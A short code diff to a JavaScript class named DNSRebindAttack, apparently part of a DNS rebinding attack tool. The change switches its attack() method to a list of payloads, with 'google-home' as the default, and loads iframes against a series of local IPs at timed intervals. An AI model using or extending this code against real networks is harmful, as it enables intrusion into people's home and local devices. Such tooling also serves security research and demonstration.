@@ -38,10 +38,10 @@ class DNSRebindAttack extends EventEmitter {
         window.addEventListener('message', receiveAttackerMessage, false)
     }
 
-    attack(ips, firstIp='127.0.0.1', payload='payload.html', interval=250) {
+    attack(ips, firstIp='127.0.0.1', payloads=['google-home'], interval=250) {
         let timeout = 0
         ips.forEach(ip => {
-            setTimeout(() => this._loadIframe(firstIp, ip, this.domain, this.port, payload), timeout += interval)
+            setTimeout(() => this._loadIframe(firstIp, ip, this.domain, this.port, 'payloads/general.html'), timeout += interval)
         })
         setTimeout(() => this.emit('all-iframes-added'), timeout)
     }
